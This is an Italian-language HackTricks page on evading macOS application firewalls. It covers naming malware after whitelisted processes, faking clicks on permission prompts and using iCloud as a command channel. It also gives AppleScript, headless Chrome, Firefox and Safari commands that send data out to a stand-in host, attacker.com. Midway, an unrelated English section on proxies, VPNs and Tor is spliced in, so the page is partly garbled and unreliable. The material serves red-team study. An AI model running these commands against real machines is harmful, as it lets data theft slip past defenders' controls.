# Bypassare i firewall di macOS

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>

## Tecniche trovate

Le seguenti tecniche sono state trovate funzionanti in alcune app firewall di macOS.

### Sfruttare nomi della whitelist

* Ad esempio chiamare il malware con nomi di processi macOS ben noti come **`launchd`**&#x20;

### Click sintetico

* Se il firewall richiede il permesso all'utente, il malware deve **cliccare su Consenti**

### **Utilizzare binari firmati da Apple**

* Come **`curl`**, ma anche altri come **`whois`**

### Domini Apple ben noti

Il firewall potrebbe consentire connessioni a domini Apple ben noti come **`apple.com`** o **`icloud.com`**. E iCloud potrebbe essere utilizzato come C2.

### Bypass generico

Alcune idee per cercare di bypassare i firewall

### Verificare il traffico consentito

Conoscere il traffico consentito ti aiuterà a identificare i domini potenzialmente presenti nella whitelist o le applicazioni che hanno il permesso di accedervi
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Sfruttare DNS

Le risoluzioni DNS vengono effettuate tramite l'applicazione firmata **`mdnsreponder`**, che probabilmente sarà autorizzata a contattare i server DNS.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Attraverso le app del browser

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Bypassing Firewalls in macOS

## Safari

Safari is the default web browser in macOS. It is important to understand how it interacts with firewalls and how to bypass them if necessary.

### Proxy Settings

Safari uses the system-wide proxy settings configured in macOS. These settings can be found in the **Network** section of **System Preferences**. By default, Safari will use the proxy settings defined in the **Automatic Proxy Configuration** or **Web Proxy (HTTP)** fields.

To bypass a firewall, you can modify the proxy settings to use a different proxy server or disable the proxy altogether.

### VPN

Using a virtual private network (VPN) can also help bypass firewalls. A VPN creates a secure connection between your device and a remote server, effectively hiding your IP address and bypassing any network restrictions.

To set up a VPN in macOS, go to the **Network** section of **System Preferences** and click on the **+** button to add a new network connection. Select **VPN** as the interface and follow the prompts to configure the VPN settings.

### Tor Browser

The Tor Browser is another option for bypassing firewalls in macOS. Tor is a network of volunteer-operated servers that allows users to browse the internet anonymously. The Tor Browser is based on the Firefox browser and routes your internet traffic through the Tor network.

To use the Tor Browser, download and install it from the official Tor Project website. Once installed, launch the Tor Browser and it will automatically connect to the Tor network.

### Conclusion

Bypassing firewalls in macOS can be achieved by modifying proxy settings, using a VPN, or utilizing the Tor Browser. These methods can help you access restricted websites and bypass network restrictions. However, it is important to use these techniques responsibly and within the boundaries of the law.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Attraverso l'iniezione di processi

Se puoi **iniettare codice in un processo** che è autorizzato a connettersi a qualsiasi server, potresti eludere le protezioni del firewall:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Riferimenti

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
